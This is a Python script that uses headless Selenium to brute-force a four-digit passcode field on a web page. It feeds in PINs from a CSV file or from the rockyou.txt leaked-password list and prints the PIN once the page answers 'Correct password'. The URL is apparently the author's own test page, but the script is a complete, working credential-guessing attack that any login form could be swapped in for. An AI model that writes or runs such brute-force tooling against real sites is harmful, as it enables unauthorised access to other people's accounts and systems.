import csv
import time
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# Function to process a batch of PINs
def process_batch(driver, batch, start_time):
    for pin in batch:
        try:
            input_field = WebDriverWait(driver, 1).until(
                EC.presence_of_element_located((By.ID, 'passcode'))
            )

            input_field.clear()
            input_field.send_keys(pin)
            input_field.send_keys(Keys.RETURN)

            try:
                alert = WebDriverWait(driver, 1).until(EC.alert_is_present())
                if "Correct password" in alert.text:
                    elapsed_time = time.time() - start_time
                    print(f"Successfully cracked the PIN: {pin}.")
                    print(f"Time taken: {elapsed_time:.4f} seconds")
                    return True  # Exit early if the correct PIN is found
            except:
                pass
        except:
            # If the input field element is not found, catch the exception and continue
            pass

    return False


def read_pin_data_from_csv(file_path):
    pin_list = []
    with open(file_path, 'r') as csvfile:
        reader = csv.reader(csvfile, delimiter=',')
        for row_number, row in enumerate(reader, start=1):
            if row and row[0].isdigit() and len(row[0]) == 4:
                pin_list.append(row[0])
            else:
                print(f"Invalid data in row {row_number}: {row}")
    return pin_list


def read_pin_data_from_txt(file_path):
    pin_list = []
    with open(file_path.strip('"'), 'r', encoding='latin-1') as txtfile:
        pin_list = txtfile.read().splitlines()
    return pin_list


def brute_force_website(url, pin_list, batch_size=50):
    options = Options()
    options.add_argument("--headless")  # Run the browser in headless mode
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(url)

        with ThreadPoolExecutor() as executor:
            for i in range(0, len(pin_list), batch_size):
                batch = pin_list[i:i + batch_size]
                start_time = time.time()  # Start the timer for the batch

                if executor.submit(process_batch, driver, batch, start_time).result():
                    # If the correct PIN is found, exit early
                    return

    finally:
        driver.quit()


if __name__ == "__main__":
    choice = input("Enter 1 to use rockyou.txt or 2 to use the original CSV file: ")

    if choice == "1":
        file_path = 'Put filepath for rockyou here (Will fix this in another update)'
        pin_list = read_pin_data_from_txt(file_path)
    elif choice == "2":
        file_path = 'Put filepath for the csv in github here (Will fix this in another update)'
        pin_list = read_pin_data_from_csv(file_path)
    else:
        print("Invalid choice. Please enter either 1 or 2.")
        exit(1)

    # Website URL to brute-force
    url = 'https://datadeity.neocities.org/'  # Currently set to my test. 

    # Start brute-forcing
    brute_force_website(url, pin_list)
